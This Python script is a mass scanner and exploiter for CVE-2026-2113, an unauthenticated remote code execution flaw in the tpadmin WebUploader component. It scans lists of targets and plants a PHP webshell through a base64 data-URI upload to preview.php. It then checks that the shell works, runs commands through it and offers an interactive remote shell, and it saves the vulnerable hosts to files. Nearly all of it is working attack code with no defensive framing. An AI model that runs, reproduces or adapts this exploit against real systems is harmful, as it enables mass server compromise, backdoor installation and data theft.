#!/usr/bin/env python3
# cve_2026_2113.py
# tpadmin WebUploader unauth RCE (CVE-2026-2113)
# scanner + exploiter · preflight -> probe -> verify -> exploit
#
# owner : https://yora1928.my.id/
# usage :
#   python cve_2026_2113.py -l daftar.txt
#   python cve_2026_2113.py -t http://1.2.3.4 --exploit
#   python cve_2026_2113.py -t http://1.2.3.4 --cmd "id"
#   python cve_2026_2113.py -t http://1.2.3.4 --shell
#   python cve_2026_2113.py -l daftar.txt --threads 10 --proxy http://127.0.0.1:8080

import argparse
import base64
import json
import os
import platform
import re
import sys
import time
import threading
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================ metadata
__tool__    = "cve_2026_2113"
__version__ = "0.2"
__owner__   = "https://yora1928.my.id/"
__cve__     = "CVE-2026-2113"

# ============================================================ windows ansi
if platform.system() == "Windows":
    os.system("")
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleMode(
            ctypes.windll.kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] install dependency: pip install requests")
    sys.exit(1)

# ============================================================ colors
class C:
    R   = "\033[0m"
    D   = "\033[2m"
    B   = "\033[1m"
    RED = "\033[38;5;203m"
    GRN = "\033[38;5;114m"
    YEL = "\033[38;5;221m"
    BLU = "\033[38;5;111m"
    MAG = "\033[38;5;183m"
    CYN = "\033[38;5;117m"
    GRY = "\033[38;5;245m"

def strip_color():
    for k in ("R","D","B","RED","GRN","YEL","BLU","MAG","CYN","GRY"):
        setattr(C, k, "")

def _c(tag, color, msg):
    print(f"{color}{tag}{C.R} {msg}", flush=True)

def info(m): _c(" [*] ", C.CYN, m)
def good(m): _c(" [+] ", C.GRN, m)
def bad(m):  _c(" [-] ", C.RED, m)
def warn(m): _c(" [!] ", C.YEL, m)

# ============================================================ banner
def banner():
    return (
        f"{C.MAG}\n"
        f"  ╔══════════════════════════════════════════════════════════════════╗\n"
        f"  ║  {C.B}{__cve__} · tpadmin WebUploader · unauthenticated RCE{C.R}{C.MAG}    ║\n"
        f"  ║  {C.D}scanner + exploiter · preflight → probe → verify → exploit{C.R}{C.MAG}     ║\n"
        f"  ║  {C.D}v{__version__} · {__owner__:<50}{C.R}{C.MAG}  ║\n"
        f"  ╚══════════════════════════════════════════════════════════════════╝{C.R}\n"
    )

# ============================================================ config
PATHS = [
    "/public/static/admin/lib/webuploader/0.1.5/server/preview.php",
    "/static/admin/lib/webuploader/0.1.5/server/preview.php",
    "/admin/lib/webuploader/0.1.5/server/preview.php",
    "/public/static/admin/lib/webuploader/0.1.5/server/upload.php",
]
FP_HINTS = ("tpadmin", "thinkphp", "webuploader")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")

# default webshell: eksekusi via parameter cmd
DEFAULT_WEBSHELL = "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"

# simbol status
SYM_VULN  = "✓"
SYM_MAYBE = "?"
SYM_NO    = "×"
SYM_SKIP  = "∅"
SYM_OK    = "●"
SYM_ERR   = "!"

# ============================================================ progress
class Progress:
    def __init__(self, total, width=28):
        self.total = max(total, 1)
        self.n = 0
        self.width = width
        self.start = time.time()
        self.lock = threading.Lock()
        self.current = ""

    def tick(self, label=""):
        with self.lock:
            self.n += 1
            self.current = label
            pct = self.n / self.total
            fill = int(self.width * pct)
            bar = "█" * fill + "░" * (self.width - fill)
            el = time.time() - self.start
            sys.stdout.write(
                f"\r  {C.GRY}{bar}{C.R} "
                f"{C.B}{self.n:>3}/{self.total}{C.R} "
                f"{C.GRY}{el:5.1f}s{C.R}  "
                f"{C.CYN}{self.current[:34]:<34}{C.R}"
            )
            sys.stdout.flush()

    def done(self):
        with self.lock:
            sys.stdout.write("\n")
            sys.stdout.flush()

# ============================================================ target
class Target:
    def __init__(self, raw, timeout=12, proxy=None):
        self.raw = raw.strip()
        self.url = self._norm(self.raw)
        self.host = urlparse(self.url).hostname or self.raw
        self.timeout = timeout
        self.sess = requests.Session()
        self.sess.verify = False
        self.sess.headers.update({"User-Agent": UA, "Accept": "*/*"})
        if proxy:
            self.sess.proxies = {"http": proxy, "https": proxy}

    @staticmethod
    def _norm(raw):
        u = raw.strip()
        if not u.startswith(("http://", "https://")):
            u = "http://" + u
        return u.rstrip("/")

    def get(self, path, **kw):
        return self.sess.get(urljoin(self.url, path), timeout=self.timeout, **kw)

    def post(self, path, **kw):
        return self.sess.post(urljoin(self.url, path), timeout=self.timeout, **kw)

# ============================================================ preflight
def preflight(t):
    try:
        r = t.get("/")
    except requests.RequestException as e:
        return False, None, f"unreachable ({e.__class__.__name__})"

    if r.status_code >= 500:
        return False, None, f"home HTTP {r.status_code}"

    body = (r.text or "").lower()
    hit = next((h for h in FP_HINTS if h in body), None)

    last_code = None
    for p in PATHS:
        try:
            pr = t.get(p, allow_redirects=False)
        except requests.RequestException:
            continue
        last_code = pr.status_code
        if pr.status_code not in (404, 410):
            why = f"preview {pr.status_code}"
            if hit:
                why += f" · fp:{hit}"
            return True, p, why

    if last_code is not None:
        return False, None, f"preview blocked (last {last_code})"
    return False, None, "preview.php not found"

# ============================================================ upload
def build_data_uri(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    return f"data:image/php;base64,{b64}"

def extract_urls(t, text):
    found = set()
    for pat in (r'https?://[^\s"\'<>]+\.php', r'["\'](/[^"\']+\.php)["\']'):
        for m in re.finditer(pat, text or "", re.I):
            u = m.group(1) if m.lastindex else m.group(0)
            found.add(u if u.startswith("http") else urljoin(t.url, u))
    return found

def upload_shell(t, preview_path, php_code, marker):
    """
    upload payload dan cari URL-nya.
    return (urls:set, inline:bool, status:int, note:str)
    """
    data = build_data_uri(php_code)
    try:
        r = t.post(
            preview_path,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=True,
        )
    except requests.RequestException as e:
        return set(), False, 0, f"upload err ({e.__class__.__name__})"

    if marker in (r.text or ""):
        return set(), True, r.status_code, "inline-exec"

    urls = extract_urls(t, r.text or "")

    try:
        j = r.json()
        for k in ("url", "path", "file", "src", "data"):
            v = j.get(k)
            if isinstance(v, str) and v.endswith(".php"):
                urls.add(urljoin(t.url, v))
            elif isinstance(v, dict):
                for vv in v.values():
                    if isinstance(vv, str) and vv.endswith(".php"):
                        urls.add(urljoin(t.url, vv))
    except ValueError:
        pass
    except Exception:
        pass

    return urls, False, r.status_code, f"HTTP {r.status_code} · {len(urls)} url"

def verify_shell(t, url, marker):
    try:
        r = t.sess.get(url, timeout=t.timeout, allow_redirects=True)
        return marker in (r.text or "")
    except requests.RequestException:
        return False

# ============================================================ exploit
def find_working_shell(t, preview_path, php_code, marker):
    """
    upload + verify, return URL webshell yang benar-benar berfungsi.
    """
    urls, inline, code, note = upload_shell(t, preview_path, php_code, marker)

    if inline:
        return "<inline>", "inline-exec"

    if not urls:
        return None, note or "no url returned"

    for u in urls:
        if verify_shell(t, u, marker):
            return u, "verified"

    return None, f"{len(urls)} url(s) · verify failed"

def execute_command(t, shell_url, command):
    """
    eksekusi perintah melalui webshell default (parameter cmd).
    """
    try:
        r = t.sess.get(
            shell_url,
            params={"cmd": command},
            timeout=t.timeout,
            allow_redirects=True,
        )
        return r.text or ""
    except requests.RequestException as e:
        return f"[ERROR] {e}"

def interactive_shell(t, shell_url):
    """
    mode interaktif: kirim perintah ke webshell, tampilkan output.
    """
    print()
    good(f"webshell aktif: {shell_url}")
    info("ketik perintah · 'exit' untuk keluar")
    print()

    while True:
        try:
            cmd = input(f"{C.CYN}shell{C.R}> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            warn("keluar dari shell")
            return
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "q"):
            return

        output = execute_command(t, shell_url, cmd)
        if output:
            print(output, end="" if output.endswith("\n") else "\n")
        else:
            warn("tidak ada output")

# ============================================================ pipeline (scan only)
def run_scan(t, dry=False):
    res = {"target": t.url, "status": "unknown",
           "preview": None, "shell": None, "note": ""}

    ok, prev, reason = preflight(t)
    res["note"] = reason
    res["preview"] = prev

    if not ok:
        res["status"] = "skip"
        return res
    if dry:
        res["status"] = "reachable"
        return res

    marker = "CVE2113_" + os.urandom(4).hex()
    shell_url, note = find_working_shell(
        t, prev, f"<?php echo '{marker}'; ?>", marker
    )

    if shell_url:
        res["status"] = "VULN"
        res["shell"] = shell_url
        res["note"] = note
        return res

    res["status"] = "maybe" if "verify failed" in note else "not-vuln"
    res["note"] = note
    return res

# ============================================================ pipeline (exploit)
def run_exploit(t, php_code=DEFAULT_WEBSHELL):
    """
    preflight -> upload webshell -> verify -> return (shell_url, note)
    """
    ok, prev, reason = preflight(t)
    if not ok:
        return None, reason, prev

    marker = "CVE2113_" + os.urandom(4).hex()

    # marker ditanam di response webshell agar bisa diverifikasi
    test_code = f"<?php echo '{marker}'; if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); }} ?>"

    shell_url, note = find_working_shell(t, prev, test_code, marker)

    if shell_url:
        return shell_url, note, prev

    return None, note, prev

# ============================================================ io
def read_list(path):
    if not os.path.isfile(path):
        bad(f"file not found: {path}")
        sys.exit(1)
    items = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            items.append(s)
    return items

def save_results(path, rows):
    txt = path.rsplit(".", 1)[0] + "_clean.txt" if "." in path else path + "_clean.txt"

    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"# tool    : {__tool__} v{__version__}\n")
            f.write(f"# owner   : {__owner__}\n")
            f.write(f"# cve     : {__cve__}\n")
            f.write(f"# scan    : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            for r in rows:
                f.write(json.dumps(r, ensure_ascii=False) + "\n")
        good(f"jsonl  → {path}")
    except OSError as e:
        bad(f"save jsonl failed: {e}")

    try:
        vuln  = [r for r in rows if r["status"] == "VULN"]
        maybe = [r for r in rows if r["status"] == "maybe"]
        clean = [r for r in rows if r["status"] not in ("VULN", "maybe")]

        with open(txt, "w", encoding="utf-8") as f:
            f.write(f"# {__cve__} · scanner v{__version__}\n")
            f.write(f"# owner: {__owner__}\n")
            f.write(f"# time : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# total={len(rows)}  vuln={len(vuln)}  maybe={len(maybe)}\n\n")

            f.write("=== VULNERABLE ===\n")
            for r in vuln:
                f.write(f"{r['target']:<45} -> {r['shell']}\n")
            if not vuln:
                f.write("(none)\n")

            f.write("\n=== MAYBE ===\n")
            for r in maybe:
                f.write(f"{r['target']:<45} # {r['note']}\n")
            if not maybe:
                f.write("(none)\n")

            f.write("\n=== CLEAN / SKIP ===\n")
            for r in clean:
                f.write(f"{r['target']:<45} # {r['status']}: {r['note']}\n")
            if not clean:
                f.write("(none)\n")

            f.write(f"\n-- generated by {__tool__} v{__version__} · {__owner__}\n")
        good(f"txt    → {txt}")
    except OSError as e:
        bad(f"save txt failed: {e}")

# ============================================================ render
def render_result(r):
    tag = r["status"]
    if tag == "VULN":
        print(f"  {C.GRN}{SYM_VULN} VULN  {C.R}{r['target']}")
        print(f"       {C.GRY}shell:{C.R} {C.CYN}{r['shell']}{C.R}")
    elif tag == "maybe":
        print(f"  {C.YEL}{SYM_MAYBE} MAYBE {C.R}{r['target']}  {C.GRY}{r['note']}{C.R}")
    elif tag == "not-vuln":
        print(f"  {C.GRY}{SYM_NO} NO    {C.R}{C.D}{r['target']}  {r['note']}{C.R}")
    elif tag == "reachable":
        print(f"  {C.CYN}{SYM_OK} OK    {C.R}{r['target']}  {C.GRY}{r['note']}{C.R}")
    elif tag == "skip":
        print(f"  {C.GRY}{SYM_SKIP} SKIP  {C.R}{C.D}{r['target']}  {r['note']}{C.R}")
    elif tag == "err":
        print(f"  {C.RED}{SYM_ERR} ERR   {C.R}{r['target']}  {C.GRY}{r['note']}{C.R}")
    else:
        print(f"  {C.GRY}· {tag:<6}{C.R}{r['target']}")

def summary_box(rows, elapsed):
    counts = {"VULN": 0, "maybe": 0, "not-vuln": 0,
              "reachable": 0, "skip": 0, "err": 0, "unknown": 0}
    for r in rows:
        counts[r.get("status", "unknown")] = counts.get(r.get("status", "unknown"), 0) + 1

    clean = counts["not-vuln"] + counts["reachable"] + counts["skip"]

    print()
    print(f"  {C.MAG}┌──────────────────────────────────────────────────────────┐{C.R}")
    print(f"  {C.MAG}│{C.R}  {C.B}SUMMARY{C.R}  ·  {__cve__} v{__version__}"
          f"                            {C.MAG}│{C.R}")
    print(f"  {C.MAG}├──────────────────────────────────────────────────────────┤{C.R}")
    print(f"  {C.MAG}│{C.R}  total targets      : {len(rows):<4}                              {C.MAG}│{C.R}")
    print(f"  {C.MAG}│{C.R}  {C.GRN}vulnerable         : {counts['VULN']:<4}{C.R}                              {C.MAG}│{C.R}")
    print(f"  {C.MAG}│{C.R}  {C.YEL}maybe (unverified) : {counts['maybe']:<4}{C.R}                              {C.MAG}│{C.R}")
    print(f"  {C.MAG}│{C.R}  {C.GRY}clean / skip       : {clean:<4}{C.R}                              {C.MAG}│{C.R}")
    print(f"  {C.MAG}│{C.R}  {C.RED}errors             : {counts['err']:<4}{C.R}                              {C.MAG}│{C.R}")
    print(f"  {C.MAG}│{C.R}  elapsed            : {elapsed:>6.1f}s                            {C.MAG}│{C.R}")
    print(f"  {C.MAG}├──────────────────────────────────────────────────────────┤{C.R}")
    print(f"  {C.MAG}│{C.R}  {C.D}owner : {__owner__:<48}{C.R}{C.MAG}│{C.R}")
    print(f"  {C.MAG}└──────────────────────────────────────────────────────────┘{C.R}")

# ============================================================ main
def main():
    ap = argparse.ArgumentParser(
        description=f"{__cve__} · tpadmin WebUploader unauth RCE · v{__version__}",
        epilog=f"owner: {__owner__}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("-t", "--target", help="single target (host or URL)")
    ap.add_argument("-l", "--list", default="daftar.txt",
                    help="target list file (default: daftar.txt)")
    ap.add_argument("-o", "--out", default="hasil.txt",
                    help="output jsonl path (default: hasil.txt)")
    ap.add_argument("--timeout", type=int, default=12, help="request timeout (s)")
    ap.add_argument("--threads", type=int, default=5, help="worker threads")
    ap.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    ap.add_argument("--dry", action="store_true",
                    help="preflight only · no upload")
    ap.add_argument("--no-color", action="store_true", help="disable ANSI color")

    # ---- exploit options
    ap.add_argument("--exploit", action="store_true",
                    help="upload webshell ke target yang rentan")
    ap.add_argument("--cmd", metavar="CMD",
                    help="eksekusi perintah tunggal melalui webshell")
    ap.add_argument("--shell", action="store_true",
                    help="mode interaktif shell")
    ap.add_argument("--payload", metavar="PHP",
                    help="kode PHP kustom untuk webshell")

    ap.add_argument("--version", action="version",
                    version=f"{__tool__} v{__version__} · {__owner__}")
    args = ap.parse_args()

    if args.no_color:
        strip_color()

    print(banner())

    # validasi: --cmd / --shell hanya untuk single target
    if (args.cmd or args.shell) and not args.target:
        bad("--cmd / --shell memerlukan --target (single target)")
        sys.exit(1)

    # kumpulkan target
    if args.target:
        raw_list = [args.target]
        info(f"mode: single target → {args.target}")
    else:
        raw_list = read_list(args.list)
        info(f"mode: list  → {args.list} ({len(raw_list)} entries)")

    if not raw_list:
        warn("no targets to process")
        sys.exit(1)

    info(f"timeout={args.timeout}s · threads={args.threads} · "
         f"dry={'yes' if args.dry else 'no'}")

    if args.exploit:
        info("mode: EXPLOIT · webshell akan ditanam")
    if args.cmd:
        info(f"mode: EXEC · perintah: {args.cmd!r}")
    if args.shell:
        info("mode: INTERACTIVE SHELL")

    if args.proxy:
        info(f"proxy={args.proxy}")
    print()

    targets = []
    for raw in raw_list:
        try:
            targets.append(Target(raw, timeout=args.timeout, proxy=args.proxy))
        except Exception as e:
            bad(f"skip {raw!r}: {e}")

    if not targets:
        bad("no valid targets · exiting")
        sys.exit(1)

    # ======================================================== single target exploit
    if args.target and (args.exploit or args.cmd or args.shell):
        t = targets[0]
        php_code = args.payload or DEFAULT_WEBSHELL

        shell_url, note, prev = run_exploit(t, php_code=php_code)

        if not shell_url:
            bad(f"exploit gagal: {note}")
            sys.exit(1)

        good(f"webshell terpasang: {shell_url}")
        info(f"preview: {prev}")

        if args.cmd:
            print()
            info(f"eksekusi: {args.cmd}")
            output = execute_command(t, shell_url, args.cmd)
            print(f"\n{C.GRY}--- output ---{C.R}")
            print(output)
            print(f"{C.GRY}--------------{C.R}")

        elif args.shell:
            interactive_shell(t, shell_url)

        else:
            info("gunakan --cmd atau --shell untuk berinteraksi dengan webshell")

        return

    # ======================================================== mass scan
    prog = Progress(len(targets))
    results = []
    vulns = []
    lock = threading.Lock()
    t0 = time.time()

    def worker(t):
        try:
            r = run_scan(t, dry=args.dry)
        except Exception as e:
            r = {"target": t.url, "status": "err",
                 "preview": None, "shell": None,
                 "note": f"{e.__class__.__name__}: {e}"}
        with lock:
            prog.tick(t.host)
            sys.stdout.write("\r" + " " * 100 + "\r")
            render_result(r)
            if r["status"] == "VULN":
                vulns.append(r)
            return r

    ex = ThreadPoolExecutor(max_workers=max(1, args.threads))
    interrupted = False
    try:
        futures = [ex.submit(worker, t) for t in targets]
        for f in as_completed(futures):
            try:
                results.append(f.result())
            except Exception as e:
                bad(f"thread: {e}")
    except KeyboardInterrupt:
        interrupted = True
        print()
        warn("interrupted · saving partial results")
    finally:
        try:
            ex.shutdown(wait=False, cancel_futures=True)
        except TypeError:
            ex.shutdown(wait=False)
        prog.done()

    elapsed = time.time() - t0
    summary_box(results, elapsed)

    if vulns:
        print()
        good("vulnerable targets:")
        for v in vulns:
            print(f"       {C.GRN}▸{C.R} {v['target']}")
            print(f"         {C.GRY}shell:{C.R} {C.CYN}{v['shell']}{C.R}")
            print(f"         {C.GRY}exploit:{C.R} "
                  f"python {os.path.basename(__file__)} -t {v['target']} --cmd \"id\"")
        print()

    print()
    save_results(args.out, results)

    print(f"\n  {C.D}done · {__tool__} v{__version__} · {__owner__}{C.R}\n")

    if interrupted:
        sys.exit(130)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YEL}[!]{C.R} stopped by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n{C.RED}[!]{C.R} fatal: {e.__class__.__name__}: {e}")
        sys.exit(1)
